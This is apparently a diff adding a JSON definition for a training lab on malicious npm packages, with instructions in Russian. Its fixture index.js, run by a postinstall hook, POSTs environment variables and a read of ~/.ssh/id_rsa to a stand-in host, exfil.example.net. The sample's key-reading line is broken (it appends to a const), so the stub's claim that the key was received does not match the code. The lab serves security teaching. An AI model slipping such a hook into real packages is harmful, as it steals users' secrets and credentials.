@@ -1,0 +1,51 @@
+{
+  "id": "web-package-poisoning",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{p0st1nst4ll_exf1l_0wn3d}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: разбор вредоносного пакета\n\nВ каталоге `pkg/` — распакованный подозрительный пакет.\nОпредели, что делает postinstall, куда уходят данные, и забери флаг\nс сервера-приёмника.\n\n1. Посмотри манифест и хук:\n   cat pkg/package.json\n2. Прочитай код хука:\n   cat pkg/index.js\n3. Найди URL приёмника:\n   grep -i http pkg/index.js\n4. Запроси URL и найди флаг:\n   curl -s http://exfil.example.net/collect\n5. Запиши флаг в found.txt и набери check.\n"
+    },
+    {
+      "path": "/home/student/task/pkg/package.json",
+      "text": "{\n  \"name\": \"some-helper\",\n  \"version\": \"2.1.0\",\n  \"scripts\": { \"postinstall\": \"node index.js\" },\n  \"description\": \"handy helpers\"\n}\n"
+    },
+    {
+      "path": "/home/student/task/pkg/index.js",
+      "text": "// obfuscated\nconst _0x1 = Buffer.from(\"aHR0cDovL2V4ZmlsLmV4YW1wbGUubmV0L2NvbGxlY3Q=\", \"base64\").toString();\nconst env = JSON.stringify(process.env);\nconst fs = require(\"fs\");\ntry { env += fs.readFileSync(process.env.HOME + \"/.ssh/id_rsa\", \"utf8\"); } catch (e) {}\nrequire(\"https\").request(_0x1, { method: \"POST\" }).end(env);\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция приёмника)",
+      "cases": [
+        {
+          "match": "exfil|collect",
+          "example": "-s http://exfil.example.net/collect",
+          "output": "{\"status\":\"received\",\"loot\":[\"env\",\"id_rsa\"],\"flag\":\"nto{p0st1nst4ll_exf1l_0wn3d}\"}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только приёмник exfil.example.net.\n"
+    },
+    "tar": {
+      "help": "tar [-t|-x|-z|-f] <архив> — работа с архивами",
+      "cases": [
+        {
+          "match": "-tzf|--list",
+          "example": "-tzf some-helper-2.1.0.tgz",
+          "output": "package/package.json\npackage/index.js\n"
+        }
+      ],
+      "fallback": "tar: в этой лабе пакет уже распакован в pkg/.\n"
+    }
+  }
+}
